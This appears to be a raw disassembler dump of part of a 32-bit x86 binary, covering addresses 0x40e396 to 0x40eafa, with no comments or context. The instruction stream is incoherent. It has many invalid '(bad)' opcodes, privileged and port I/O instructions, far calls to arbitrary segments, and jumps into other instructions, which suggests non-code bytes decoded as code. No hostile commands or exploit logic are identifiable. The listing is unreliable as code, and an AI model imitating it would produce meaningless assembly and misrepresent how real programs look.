  40e396:	mov    ds:0x4f114004,eax
  40e39b:	push   cs
  40e39c:	adc    al,BYTE PTR [esi+ecx*4-0x265c34d8]
  40e3a3:	inc    ecx
  40e3a4:	adc    DWORD PTR [ebp-0x2f875183],esi
  40e3aa:	int3   
  40e3ab:	(bad)  
  40e3ac:	arpl   WORD PTR [eax],dx
  40e3ae:	nop
  40e3af:	int3   
  40e3b0:	push   0x4c
  40e3b2:	pop    edi
  40e3b3:	mov    cs,WORD PTR [ebx]
  40e3b5:	stos   BYTE PTR es:[edi],al
  40e3b6:	and    DWORD PTR [eax+0x59],0x2023e2f1
  40e3bd:	fistp  QWORD PTR [eax-0x14]
  40e3c0:	aaa    
  40e3c1:	mov    fs,WORD PTR [edx-0x45190d4a]
  40e3c7:	xor    esp,ebx
  40e3c9:	mov    al,ds:0x986fdf95
  40e3ce:	xor    DWORD PTR [edx],esp
  40e3d0:	test   DWORD PTR [ebx],0x671a6f84
  40e3d6:	jecxz  0x40e3bb
  40e3d8:	or     al,0x4b
  40e3da:	fst    DWORD PTR [esi+0x5b]
  40e3dd:	popf   
  40e3de:	mov    bh,BYTE PTR [edx-0x32ac6407]
  40e3e4:	mov    ch,0xc3
  40e3e6:	hlt    
  40e3e7:	add    BYTE PTR [ecx],dh
  40e3e9:	mov    ecx,0xfa380d2
  40e3ee:	jl     0x40e371
  40e3f0:	shr    DWORD PTR [ebx-0x38],cl
  40e3f3:	dec    esi
  40e3f4:	dec    edx
  40e3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e3f6:	mov    dh,0x53
  40e3f8:	sub    al,0xbe
  40e3fa:	sbb    BYTE PTR [ebx],dl
  40e3fc:	xor    BYTE PTR [ebp-0x4a],0x34
  40e400:	jae    0x40e466
  40e402:	loope  0x40e453
  40e404:	(bad)  
  40e405:	xchg   edx,eax
  40e406:	pop    ss
  40e407:	dec    edx
  40e408:	xor    eax,0x7709df9e
  40e40d:	jge    0x40e3ed
  40e40f:	imul   edx,DWORD PTR [edx-0x77474bed],0x5772ea22
  40e419:	dec    eax
  40e41a:	test   eax,0x1b367da
  40e41f:	or     BYTE PTR [edi-0x6ddc1a3a],0x66
  40e426:	mov    ch,0x70
  40e428:	rol    edi,1
  40e42a:	fdiv   DWORD PTR [ebx]
  40e42c:	cmp    eax,0x26277e57
  40e431:	jle    0x40e3c7
  40e433:	icebp  
  40e434:	fwait
  40e435:	or     al,0x2
  40e437:	xor    DWORD PTR [ecx],ecx
  40e439:	fcom   DWORD PTR [ebx-0x6514cd0e]
  40e43f:	enter  0x4fee,0x8b
  40e443:	cmc    
  40e444:	xchg   esp,eax
  40e445:	(bad)  
  40e447:	loopne 0x40e3ce
  40e449:	mov    bl,0x1a
  40e44b:	pop    ebx
  40e44c:	fwait
  40e44d:	adc    esi,ebx
  40e44f:	fstp   DWORD PTR [edi+ebx*2-0x7ae3fff3]
  40e456:	push   ecx
  40e457:	push   ecx
  40e458:	imul   eax,DWORD PTR gs:[ebp-0x5f1253cd],0xffffffec
  40e460:	add    edi,DWORD PTR [esi]
  40e462:	mov    ds:0xe7bc442a,al
  40e467:	sbb    al,0x86
  40e469:	clc    
  40e46a:	imul   bl
  40e46c:	fld    QWORD PTR [ebx]
  40e46e:	rol    DWORD PTR [ebx],0x6a
  40e471:	daa    
  40e472:	sub    dh,BYTE PTR [edi-0x1d]
  40e475:	jnp    0x40e44f
  40e477:	ror    DWORD PTR [eax-0x496e12a],0x83
  40e47e:	jge    0x40e4e1
  40e480:	lea    edi,[ebp-0x7bf8debc]
  40e486:	gs mov esp,0xbca4c2e7
  40e48c:	aad    0x96
  40e48e:	sub    BYTE PTR [esi+0x7a],ah
  40e491:	js     0x40e4a0
  40e493:	stos   BYTE PTR es:[edi],al
  40e494:	(bad)  
  40e495:	imul   ecx,DWORD PTR [eax+0x54ca9929],0xffffff89
  40e49c:	neg    BYTE PTR [ebx]
  40e49e:	pop    ebx
  40e49f:	dec    edi
  40e4a0:	sub    BYTE PTR [eax+edx*1-0x42],ah
  40e4a4:	mov    ds:0x1cd6ca17,al
  40e4a9:	ja     0x40e477
  40e4ab:	in     eax,dx
  40e4ac:	in     al,dx
  40e4ad:	add    edx,DWORD PTR [ebp+0x53]
  40e4b0:	aam    0x61
  40e4b2:	add    al,0xee
  40e4b4:	cmp    dl,bh
  40e4b6:	mov    ch,BYTE PTR [ecx+0xc]
  40e4b9:	das    
  40e4ba:	addr16 (bad) 
  40e4bc:	int    0xce
  40e4be:	(bad)  
  40e4c0:	inc    ebx
  40e4c1:	lea    esp,[esi+ebp*2]
  40e4c4:	inc    ecx
  40e4c5:	outs   dx,BYTE PTR ds:[esi]
  40e4c6:	adc    DWORD PTR [ecx-0x4b1fec2c],esi
  40e4cc:	retf   
  40e4cd:	xor    BYTE PTR [edi],cl
  40e4cf:	and    eax,DWORD PTR [edx]
  40e4d1:	mov    WORD PTR [ebx],es
  40e4d3:	sbb    DWORD PTR [ecx+ebx*1+0x465be3be],esp
  40e4da:	mov    edx,0x73efdf2b
  40e4df:	mov    eax,ds:0x43b97d21
  40e4e4:	mov    dl,0x8f
  40e4e6:	into   
  40e4e7:	push   ds
  40e4e8:	aad    0xf0
  40e4ea:	enter  0x2beb,0xe0
  40e4ee:	jle    0x40e504
  40e4f0:	stc    
  40e4f1:	sub    cl,BYTE PTR [ecx-0x5]
  40e4f4:	jp     0x40e4f7
  40e4f6:	cmp    ebx,ecx
  40e4f8:	fwait
  40e4f9:	pop    edi
  40e4fa:	or     DWORD PTR [ebp-0x1a],esp
  40e4fd:	push   edi
  40e4fe:	adc    al,0x9f
  40e500:	mov    eax,0x7f7b1335
  40e505:	cmp    DWORD PTR [ebx-0x4e],esp
  40e508:	rcl    edx,cl
  40e50a:	mov    bh,0x1c
  40e50c:	lods   al,BYTE PTR ds:[esi]
  40e50d:	cmc    
  40e50e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e50f:	(bad)  
  40e510:	pop    es
  40e511:	cmp    BYTE PTR [ebx-0x33],ah
  40e514:	mov    edi,0x6c1eccc1
  40e519:	shl    BYTE PTR [edx],cl
  40e51b:	arpl   sp,ax
  40e51d:	pushf  
  40e51e:	int3   
  40e51f:	jmp    0x40e594
  40e521:	push   eax
  40e522:	loopne 0x40e555
  40e524:	(bad)  
  40e525:	xor    al,0xf9
  40e527:	in     al,0xd0
  40e529:	pop    ebx
  40e52a:	ins    BYTE PTR es:[edi],dx
  40e52b:	imul   ebx,DWORD PTR ss:[ecx+ecx*4+0x7d7caec8],0x3f
  40e534:	xchg   edx,eax
  40e535:	arpl   WORD PTR [edx-0x7c3ae2b9],di
  40e53b:	mov    eax,ds:0xa02106fc
  40e540:	sahf   
  40e541:	daa    
  40e542:	push   edi
  40e543:	jge    0x40e4d0
  40e545:	inc    DWORD PTR [esi+edx*2-0x6a]
  40e549:	jecxz  0x40e555
  40e54b:	xor    DWORD PTR [edi-0x6e],esi
  40e54e:	ins    BYTE PTR es:[edi],dx
  40e54f:	xchg   edi,eax
  40e550:	scas   al,BYTE PTR es:[edi]
  40e551:	adc    edi,DWORD PTR [edx-0x456be3b4]
  40e557:	mov    cl,BYTE PTR [edi+0x516f5710]
  40e55d:	add    dh,0x5a
  40e560:	test   eax,edx
  40e562:	lock jns 0x40e597
  40e565:	lods   eax,DWORD PTR ds:[esi]
  40e566:	mov    cl,0xe4
  40e568:	dec    ebx
  40e569:	xchg   esi,eax
  40e56a:	push   0x3eb893d4
  40e56f:	out    0x84,al
  40e571:	leave  
  40e572:	jnp    0x40e598
  40e574:	mov    esp,0xbb414056
  40e579:	imul   eax,ebp,0xd13f89be
  40e57f:	pop    es
  40e580:	dec    esi
  40e581:	cmp    al,0xb4
  40e583:	sub    DWORD PTR [esi-0xd],ebx
  40e586:	les    eax,FWORD PTR ds:0x3ace1264
  40e58c:	xor    eax,0xdfcbf402
  40e591:	jl     0x40e609
  40e593:	cwde   
  40e594:	fidiv  DWORD PTR gs:[ecx+0x15069998]
  40e59b:	push   ecx
  40e59c:	cmp    al,0x6e
  40e59e:	arpl   WORD PTR ds:0x358d935b,bx
  40e5a4:	(bad)  
  40e5a5:	cwde   
  40e5a6:	clc    
  40e5a7:	(bad)  
  40e5a9:	cmp    DWORD PTR ds:0xe3cd243b,esi
  40e5af:	add    al,0xad
  40e5b1:	adc    al,0x67
  40e5b3:	mov    dl,0x32
  40e5b5:	and    BYTE PTR [edi+eax*4-0x7a],cl
  40e5b9:	jge    0x40e553
  40e5bb:	addr16 out 0xa1,eax
  40e5be:	pop    ebp
  40e5bf:	mov    dl,0x31
  40e5c1:	out    dx,eax
  40e5c2:	jmp    0xa97a157d
  40e5c7:	xchg   edi,eax
  40e5c8:	sub    ah,BYTE PTR [ebx-0x54]
  40e5cb:	das    
  40e5cc:	ja     0x40e5ab
  40e5ce:	adc    eax,0xb4effe47
  40e5d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5d4:	mov    ch,0xac
  40e5d6:	add    BYTE PTR [eax+0x6c60aa5a],0x11
  40e5dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e5de:	rcr    BYTE PTR [esi-0x56],0xb2
  40e5e2:	rcr    BYTE PTR [esi+0x41],1
  40e5e5:	mov    esi,0xd6092a71
  40e5ea:	and    ah,bl
  40e5ec:	fadd   DWORD PTR [edi]
  40e5ee:	or     ecx,DWORD PTR [ecx+0x7c]
  40e5f1:	js     0x40e604
  40e5f3:	xchg   DWORD PTR [edi],ebx
  40e5f5:	adc    ebp,DWORD PTR [esi-0x23]
  40e5f8:	cmp    BYTE PTR [ebx],0xd2
  40e5fb:	clc    
  40e5fc:	shr    BYTE PTR [esi],0xdb
  40e5ff:	rol    DWORD PTR [ecx+0x72ef68c9],cl
  40e605:	scas   al,BYTE PTR es:[edi]
  40e606:	sbb    cl,bh
  40e608:	imul   esi,ebx,0x10
  40e60b:	xchg   DWORD PTR es:[esp+ebx*1],edi
  40e60f:	les    ebp,FWORD PTR [esp+ebx*1-0x1de9108]
  40e616:	adc    al,0x63
  40e618:	lea    esi,[eax+edi*2+0x43]
  40e61c:	shr    DWORD PTR [eax+ebp*8-0x1b2e7f4b],1
  40e623:	sbb    DWORD PTR [esi],ebp
  40e625:	xchg   esp,eax
  40e626:	push   es
  40e627:	mov    ebx,cs
  40e629:	inc    ebx
  40e62a:	pop    eax
  40e62b:	jge    0x40e675
  40e62d:	xor    al,0x65
  40e62f:	or     DWORD PTR [ebp-0x6fe8591f],eax
  40e635:	adc    eax,0xa8cca04
  40e63a:	and    BYTE PTR [ecx+0x3b],dl
  40e63d:	rcl    bl,cl
  40e63f:	mov    al,0x36
  40e642:	adc    bl,BYTE PTR [edi]
  40e644:	push   ebp
  40e645:	cs leave 
  40e647:	retf   0x60a
  40e64a:	ss daa 
  40e64c:	mov    ebp,0x110634cb
  40e651:	in     eax,0x1d
  40e653:	mov    edi,0xd5c05232
  40e658:	test   eax,0xd1d8fdcb
  40e65d:	sahf   
  40e65e:	aas    
  40e65f:	sub    eax,0xc6807b7e
  40e664:	adc    BYTE PTR [esi+0x51],al
  40e667:	push   0x1f565f09
  40e66c:	call   0x9a11ba82
  40e671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e672:	mov    eax,ds:0xfd3a8ab8
  40e677:	adc    al,0x59
  40e679:	dec    ebx
  40e67a:	icebp  
  40e67b:	sbb    DWORD PTR [eax+esi*2],ebp
  40e67e:	sbb    DWORD PTR [esp+ecx*4],ebx
  40e681:	cdq    
  40e682:	shl    DWORD PTR [ebx+0x7a94e92c],cl
  40e688:	test   al,0xe
  40e68a:	(bad)  
  40e68b:	xchg   ecx,eax
  40e68c:	retf   0x4e28
  40e68f:	or     BYTE PTR [ecx+eax*8+0xcffac60],0xff
  40e697:	addr16 imul esp,ebx,0x3c20d74a
  40e69e:	jnp    0x40e6d4
  40e6a0:	mov    WORD PTR [ebx+edi*2+0x3aaa25da],es
  40e6a7:	cmp    edi,DWORD PTR [eax]
  40e6a9:	fdivp  st(1),st
  40e6ab:	push   ss
  40e6ac:	sub    DWORD PTR [eax-0x44240331],ebp
  40e6b2:	in     al,0xe4
  40e6b4:	shl    DWORD PTR [edi-0x6a],cl
  40e6b7:	push   edx
  40e6b8:	pop    eax
  40e6b9:	xchg   BYTE PTR [edi-0x4f],dh
  40e6bc:	dec    ebx
  40e6bd:	dec    edi
  40e6be:	mov    eax,0x4810192a
  40e6c3:	add    al,0x96
  40e6c5:	js     0x40e717
  40e6c7:	mov    edx,0x81cc2ffa
  40e6cc:	push   ebx
  40e6cd:	fimul  WORD PTR [ebx+0x48]
  40e6d0:	test   eax,0x479c126a
  40e6d5:	lods   al,BYTE PTR ds:[esi]
  40e6d6:	ins    BYTE PTR es:[edi],dx
  40e6d7:	shr    BYTE PTR [ebx],cl
  40e6d9:	in     al,0xe4
  40e6db:	push   esp
  40e6dc:	cmc    
  40e6dd:	fmul   DWORD PTR [eax+0x580e3e90]
  40e6e3:	xchg   edi,eax
  40e6e4:	cli    
  40e6e5:	mov    ch,0x27
  40e6e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e6e8:	imul   edx,ecx,0x52
  40e6eb:	sub    BYTE PTR ds:0x9a9c2729,al
  40e6f1:	gs push edi
  40e6f3:	cmp    BYTE PTR [ebx-0x3039043b],dl
  40e6f9:	jo     0x40e67f
  40e6fb:	pop    ecx
  40e6fc:	mov    eax,0x5a648f5f
  40e701:	jbe    0x40e75f
  40e703:	adc    al,BYTE PTR [esi-0x5d4779aa]
  40e709:	xlat   BYTE PTR ds:[ebx]
  40e70a:	pop    ds
  40e70b:	daa    
  40e70c:	ds mov dh,0xb2
  40e70f:	retf   
  40e710:	aad    0xf0
  40e712:	leave  
  40e713:	add    al,BYTE PTR [esp+ecx*1]
  40e716:	mov    bh,0xb2
  40e718:	les    ebx,FWORD PTR [edi+0x73]
  40e71b:	dec    ecx
  40e71c:	push   edi
  40e71d:	jge    0x40e706
  40e71f:	retf   
  40e720:	mov    eax,0x2b62b3fb
  40e725:	push   ebp
  40e726:	stc    
  40e727:	(bad)  
  40e728:	sbb    BYTE PTR [ecx+ecx*1-0x74c9c138],ah
  40e72f:	repz mov cl,0xf0
  40e732:	stc    
  40e733:	jns    0x40e74f
  40e735:	popf   
  40e736:	add    al,0x21
  40e738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e739:	cmp    esp,DWORD PTR [esi-0x58]
  40e73c:	inc    esi
  40e73d:	xchg   esi,eax
  40e73e:	push   eax
  40e73f:	sub    eax,0x2231f896
  40e744:	inc    ecx
  40e745:	sub    dh,BYTE PTR [eax+0x5d6de804]
  40e74b:	xchg   eax,eax
  40e74d:	pop    esi
  40e74e:	pop    ds
  40e74f:	iret   
  40e750:	fsubr  QWORD PTR [ebx+0x41]
  40e753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e754:	pop    edi
  40e755:	dec    eax
  40e756:	push   esi
  40e757:	mov    ch,0x5b
  40e759:	loopne 0x40e7b7
  40e75b:	push   ds
  40e75c:	and    edx,ebx
  40e75e:	pop    ds
  40e75f:	outs   dx,DWORD PTR ds:[esi]
  40e760:	aaa    
  40e761:	jp     0x40e7d7
  40e763:	jb     0x40e781
  40e765:	shl    DWORD PTR [eax+0x76],1
  40e768:	pop    es
  40e769:	not    BYTE PTR [ebx]
  40e76b:	mov    ebx,0xb5b629c0
  40e770:	pop    esp
  40e771:	pop    ecx
  40e772:	in     al,dx
  40e773:	cwde   
  40e774:	mov    ecx,0x878f5aa7
  40e779:	mov    DWORD PTR [ecx+0x46],ebx
  40e77c:	jle    0x40e70d
  40e77e:	shl    esp,0xac
  40e781:	cmc    
  40e782:	loopne 0x40e7b8
  40e784:	fs jle 0x40e79a
  40e787:	inc    edi
  40e788:	arpl   WORD PTR [esp+ecx*4+0x4f5d887e],si
  40e78f:	call   0xe8deb7ee
  40e794:	push   es
  40e795:	aaa    
  40e796:	ds sub eax,0xc0a62ca
  40e79c:	mov    ebx,0x88068d2
  40e7a1:	xchg   DWORD PTR [ebx-0x7c],ecx
  40e7a4:	mov    BYTE PTR [eax],bh
  40e7a6:	adc    DWORD PTR [ebx+0x626a38bb],edx
  40e7ac:	add    edi,DWORD PTR [edi+ebp*1+0x6668f008]
  40e7b3:	adc    ebx,DWORD PTR [ebx+eiz*1-0x3216149f]
  40e7ba:	pop    edi
  40e7bb:	push   ds
  40e7bc:	xchg   cx,ax
  40e7be:	mul    DWORD PTR [edx+0x39]
  40e7c1:	(bad)
  40e7c4:	or     eax,0xf8d37911
  40e7c9:	(bad)  
  40e7ca:	pop    edi
  40e7cb:	(bad)  
  40e7cc:	fs jno 0x40e75b
  40e7cf:	in     al,0x34
  40e7d1:	lahf   
  40e7d2:	and    DWORD PTR [ebx+0x653fb5ed],eax
  40e7d8:	loop   0x40e791
  40e7da:	cmc    
  40e7db:	fcomp  QWORD PTR [ecx+eiz*2]
  40e7de:	dec    esp
  40e7df:	or     ebx,DWORD PTR [eax+eiz*2+0x20]
  40e7e3:	pop    edi
  40e7e4:	dec    ecx
  40e7e5:	(bad)  
  40e7e6:	ss pop ss
  40e7e8:	(bad)  
  40e7e9:	fld    QWORD PTR [edi]
  40e7eb:	fdivr  QWORD PTR [edx-0x12]
  40e7ee:	push   esi
  40e7ef:	jns    0x40e7ce
  40e7f1:	xchg   ecx,eax
  40e7f2:	add    ebp,DWORD PTR [edx-0x1a]
  40e7f5:	xor    bl,ah
  40e7f7:	out    dx,al
  40e7f8:	pop    esp
  40e7f9:	push   ss
  40e7fa:	ins    DWORD PTR es:[edi],dx
  40e7fb:	mov    bl,0xd7
  40e7fd:	or     BYTE PTR [ecx+0x22],0xd5
  40e801:	push   0x5c
  40e803:	fsubp  st(5),st
  40e805:	push   ecx
  40e806:	leave  
  40e807:	addr16 es leave 
  40e80a:	test   eax,0x9afc6611
  40e80f:	xchg   esi,eax
  40e810:	in     al,0x81
  40e812:	jbe    0x40e85f
  40e814:	pusha  
  40e815:	rcl    DWORD PTR [ecx],0xab
  40e818:	(bad)  
  40e819:	mov    gs,WORD PTR [edx-0x2e]
  40e81c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e81d:	xchg   edx,eax
  40e81e:	loop   0x40e801
  40e820:	pop    ds
  40e821:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e822:	aas    
  40e823:	rcr    BYTE PTR [ecx-0x101926e0],cl
  40e829:	pusha  
  40e82a:	xchg   ebx,eax
  40e82b:	loope  0x40e7dd
  40e82d:	ret    0x37bd
  40e830:	dec    ecx
  40e831:	inc    BYTE PTR [ecx]
  40e833:	mov    ebx,0xdad50fd8
  40e838:	je     0x40e868
  40e83a:	ja     0x40e81f
  40e83c:	xchg   ebp,eax
  40e83d:	loopne 0x40e879
  40e83f:	into   
  40e840:	adc    cl,BYTE PTR [eax+eiz*8-0x71]
  40e844:	or     eax,0xc6f0119
  40e849:	sub    esi,edx
  40e84b:	inc    edx
  40e84c:	iret   
  40e84d:	or     BYTE PTR [esi-0x72c954ea],ah
  40e853:	fcomp  DWORD PTR es:[esi+0x68]
  40e857:	test   al,0x27
  40e859:	jns    0x40e87f
  40e85b:	or     ah,BYTE PTR [ebp+0x6127aa89]
  40e861:	mov    eax,ds:0xa779ea6a
  40e866:	xchg   edx,eax
  40e867:	cmp    ecx,edi
  40e869:	retf   0xb6d8
  40e86c:	add    al,0x85
  40e86e:	je     0x40e830
  40e870:	or     DWORD PTR ds:0x86eec465,eax
  40e876:	add    eax,0x8d4ca131
  40e87b:	inc    ebp
  40e87c:	stos   DWORD PTR es:[edi],eax
  40e87d:	jg     0x40e83b
  40e87f:	rcr    DWORD PTR [eax],0x43
  40e882:	dec    ebp
  40e883:	mov    esi,ds
  40e885:	push   edx
  40e886:	cmp    al,0xd3
  40e888:	sar    ch,0x7d
  40e88b:	cld    
  40e88c:	test   al,0xd
  40e88e:	sar    BYTE PTR gs:[esi],1
  40e891:	jo     0x40e878
  40e893:	cmp    ecx,edx
  40e895:	je     0x40e906
  40e897:	cli    
  40e898:	ins    DWORD PTR es:[edi],dx
  40e899:	hlt    
  40e89a:	adc    al,0xfd
  40e89c:	jmp    0x59acd406
  40e8a1:	xchg   edi,eax
  40e8a2:	and    ch,cl
  40e8a4:	div    BYTE PTR ds:0xc686688
  40e8aa:	xor    edx,DWORD PTR [ecx-0x7c8878d0]
  40e8b0:	fnsave [ecx+0x41]
  40e8b3:	std    
  40e8b4:	cli    
  40e8b5:	fstp   DWORD PTR [edx+edx*2]
  40e8b8:	pusha  
  40e8b9:	mov    bl,0xff
  40e8bb:	out    0x53,al
  40e8bd:	je     0x40e8b7
  40e8bf:	int    0x60
  40e8c1:	in     eax,0xb7
  40e8c3:	or     al,dl
  40e8c5:	cmp    esp,DWORD PTR [ebp+0x1bacaef8]
  40e8cb:	add    bl,BYTE PTR [eax+eax*2+0x1]
  40e8cf:	sbb    eax,0xe507cd6f
  40e8d4:	mov    BYTE PTR es:[edi-0x1e],bh
  40e8d8:	iret   
  40e8d9:	ins    BYTE PTR es:[edi],dx
  40e8da:	hlt    
  40e8db:	sub    eax,0xfd2ff904
  40e8e0:	int3   
  40e8e1:	lods   al,BYTE PTR ds:[esi]
  40e8e2:	xor    DWORD PTR [edx],esp
  40e8e4:	mov    ds:0x58e8b35,al
  40e8e9:	push   esp
  40e8ea:	inc    eax
  40e8eb:	xchg   DWORD PTR [ecx-0x3fb98f2],esp
  40e8f1:	aaa    
  40e8f2:	and    edi,DWORD PTR [edi]
  40e8f4:	cmp    ebx,DWORD PTR ds:0xb2506749
  40e8fa:	inc    eax
  40e8fb:	jecxz  0x40e8c2
  40e8fd:	loop   0x40e8b2
  40e8ff:	dec    edx
  40e900:	ficomp DWORD PTR [ebx-0x19]
  40e903:	das    
  40e904:	push   ds
  40e905:	push   bp
  40e907:	mov    esi,0xdfc1c645
  40e90c:	sbb    eax,0x51289fc8
  40e911:	xor    eax,0xf5ac5ed3
  40e916:	sahf   
  40e917:	adc    al,0x90
  40e919:	add    DWORD PTR [eax+0x103ed3c3],esp
  40e91f:	out    0x80,al
  40e921:	push   edi
  40e922:	mov    BYTE PTR [ebx],dh
  40e924:	jae    0x40e96d
  40e926:	enter  0x24a7,0xc7
  40e92a:	dec    eax
  40e92b:	xchg   ebp,eax
  40e92c:	pop    esp
  40e92d:	jecxz  0x40e8fc
  40e92f:	rol    ecx,cl
  40e931:	loop   0x40e98f
  40e933:	xlat   BYTE PTR ds:[ebx]
  40e934:	mov    ch,BYTE PTR [ebx]
  40e936:	mov    ds:0xd93ad769,al
  40e93b:	pop    eax
  40e93c:	sti    
  40e93d:	retf   
  40e93e:	sbb    edi,DWORD PTR [ebx+ebx*2-0x56b776ea]
  40e945:	push   ecx
  40e946:	mov    BYTE PTR [ebx+0x6f],dh
  40e949:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e94a:	pop    DWORD PTR [eax]
  40e94c:	mov    dl,0x3a
  40e94e:	dec    DWORD PTR [ebp+0x7691b39]
  40e954:	jae    0x40e915
  40e956:	sub    dh,cl
  40e958:	mov    ebx,0x5c7b014
  40e95d:	add    edi,ebx
  40e95f:	outs   dx,BYTE PTR ds:[esi]
  40e960:	jge    0x40e911
  40e962:	inc    ecx
  40e963:	xchg   edx,eax
  40e964:	out    dx,eax
  40e965:	pop    eax
  40e966:	dec    eax
  40e967:	adc    BYTE PTR [edi-0x7feaa238],al
  40e96d:	sbb    al,0xe9
  40e96f:	cdq    
  40e970:	mov    cl,0x96
  40e972:	push   es
  40e973:	cld    
  40e974:	enter  0x3658,0x30
  40e978:	adc    DWORD PTR [eax],ecx
  40e97a:	jb     0x40e94e
  40e97c:	sbb    eax,0xa01f55c
  40e981:	cmp    DWORD PTR [esp+edi*2],eax
  40e984:	outs   dx,DWORD PTR ds:[esi]
  40e985:	and    DWORD PTR [ebx+edi*2],ecx
  40e988:	imul   eax,DWORD PTR [edx],0xffffffcb
  40e98b:	aas    
  40e98c:	call   0x55d0:0x78725504
  40e993:	(bad)  
  40e994:	imul   ebx,DWORD PTR [ecx+0x7b],0xf
  40e998:	mov    ah,al
  40e99a:	pushf  
  40e99b:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e99d:	xor    al,BYTE PTR [ebp+0x1e90755e]
  40e9a3:	sbb    esp,eax
  40e9a5:	pop    ebx
  40e9a6:	loope  0x40e9b6
  40e9a8:	xor    eax,0x87f131d7
  40e9ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ae:	popf   
  40e9af:	ret    
  40e9b0:	mov    bl,0xa6
  40e9b2:	pop    esp
  40e9b3:	mov    bl,0x45
  40e9b5:	or     edx,DWORD PTR [edi]
  40e9b7:	xchg   ebp,eax
  40e9b8:	mov    edi,DWORD PTR [eax-0x5c2e05cb]
  40e9be:	scas   al,BYTE PTR es:[edi]
  40e9bf:	add    eax,0x644c0e17
  40e9c4:	mov    bl,0x4a
  40e9c6:	jns    0x40e99e
  40e9c8:	shl    BYTE PTR [ebp-0x2a],0x22
  40e9cc:	dec    edx
  40e9cd:	out    0x89,al
  40e9cf:	scas   al,BYTE PTR es:[edi]
  40e9d0:	jne    0x40e9ca
  40e9d2:	mov    eax,ds:0x9cc3eee8
  40e9d7:	imul   ecx,DWORD PTR [ebp+0x283f61a2],0xffffffb3
  40e9de:	enter  0x4511,0xb5
  40e9e2:	cmp    BYTE PTR [edi-0x7b],ah
  40e9e5:	stos   BYTE PTR es:[edi],al
  40e9e6:	rcr    cl,cl
  40e9e8:	sbb    esi,DWORD PTR [esi]
  40e9ea:	(bad)  
  40e9eb:	xchg   esi,eax
  40e9ec:	xchg   ecx,eax
  40e9ed:	leave  
  40e9ee:	test   al,0x86
  40e9f0:	pop    esp
  40e9f1:	pusha  
  40e9f2:	dec    edx
  40e9f3:	mov    ds:0x456f8812,eax
  40e9f8:	mov    BYTE PTR [ebx],0x0
  40e9fb:	gs or  al,0x25
  40e9fe:	mov    al,ds:0x2a693652
  40ea03:	inc    esi
  40ea04:	int3   
  40ea05:	jmp    0x40ea46
  40ea07:	xchg   edi,eax
  40ea08:	aam    0x2a
  40ea0a:	lock fcom DWORD PTR [edi-0x62]
  40ea0e:	enter  0x413a,0xf0
  40ea12:	repz cmp DWORD PTR [esp+eax*1+0x8a5d6eb],ecx
  40ea1a:	ss call 0x989b:0x33165c20
  40ea22:	sbb    al,0xfe
  40ea24:	pop    ecx
  40ea25:	fild   QWORD PTR [edx]
  40ea27:	or     BYTE PTR [ecx-0x398bcbf5],al
  40ea2d:	and    eax,0x3fdee90d
  40ea32:	push   es
  40ea33:	sbb    BYTE PTR [esi-0x7a],dh
  40ea36:	mov    al,ds:0x734d48f4
  40ea3b:	pop    esp
  40ea3c:	test   DWORD PTR [ecx+0x19296ec],ebp
  40ea42:	lods   al,BYTE PTR ds:[esi]
  40ea43:	mov    eax,0x7bd8186
  40ea48:	outs   dx,BYTE PTR ds:[esi]
  40ea49:	rcl    BYTE PTR [edi+0x3cf0cb4a],1
  40ea4f:	cld    
  40ea50:	mov    ds:0x8b7a93d3,al
  40ea55:	xchg   ebx,eax
  40ea56:	(bad)  
  40ea57:	test   eax,0xefa52f76
  40ea5c:	ror    DWORD PTR [esi+ecx*1],0x88
  40ea60:	add    eax,0xe0821545
  40ea65:	dec    ecx
  40ea66:	lds    eax,FWORD PTR [esi+eiz*4+0x19744e38]
  40ea6d:	fs ss leave 
  40ea70:	adc    dh,BYTE PTR [esi]
  40ea72:	fistp  WORD PTR [ecx+0x25]
  40ea75:	add    dl,bl
  40ea77:	inc    esi
  40ea78:	mov    esp,gs
  40ea7a:	les    ebx,FWORD PTR [edx-0x59608da2]
  40ea80:	xor    DWORD PTR [esi+0x51],esi
  40ea83:	ins    BYTE PTR es:[edi],dx
  40ea84:	sbb    dh,0xa9
  40ea87:	sub    DWORD PTR [ebx-0x7a],edx
  40ea8a:	xlat   BYTE PTR ds:[ebx]
  40ea8b:	pop    eax
  40ea8c:	sti    
  40ea8d:	push   cs
  40ea8e:	pop    ss
  40ea8f:	inc    ebp
  40ea90:	sub    BYTE PTR [ebp-0x58],bh
  40ea93:	dec    ebp
  40ea94:	in     al,0xdd
  40ea96:	scas   eax,DWORD PTR es:[edi]
  40ea97:	adc    DWORD PTR [ebx+0x14d0c81e],edi
  40ea9d:	mov    dl,0xe7
  40ea9f:	xchg   edx,eax
  40eaa0:	arpl   WORD PTR [ebx+0x5aa5b3b0],bx
  40eaa6:	inc    esp
  40eaa7:	lea    esp,[ebp+edi*1-0x255cb87c]
  40eaae:	mov    eax,ds:0xe28ed742
  40eab3:	xor    eax,0xf3888e5e
  40eab8:	push   cs
  40eab9:	add    ecx,0x1a40e4d5
  40eabf:	inc    esi
  40eac0:	adc    al,0xd4
  40eac2:	or     al,0x28
  40eac4:	(bad)  
  40eac5:	mov    al,0x88
  40eac7:	call   0xd383:0xa651c0cb
  40eace:	add    bl,BYTE PTR [ecx+0x54]
  40ead1:	mov    cl,0x3a
  40ead3:	mov    eax,0x33563a46
  40ead8:	add    eax,0xadecbdf
  40eadd:	call   FWORD PTR ds:0xb7f28119
  40eae3:	push   edx
  40eae4:	shl    BYTE PTR [edx],0x81
  40eae7:	push   ebp
  40eae8:	sub    eax,0xf0ef56ab
  40eaed:	lods   al,BYTE PTR ds:[esi]
  40eaee:	outs   dx,DWORD PTR ds:[esi]
  40eaef:	adc    edi,0x34
  40eaf2:	sub    eax,0xaad8308c
  40eaf7:	ret    
  40eaf8:	jp     0x40eb1c
  40eafa:	adc    al,0x84
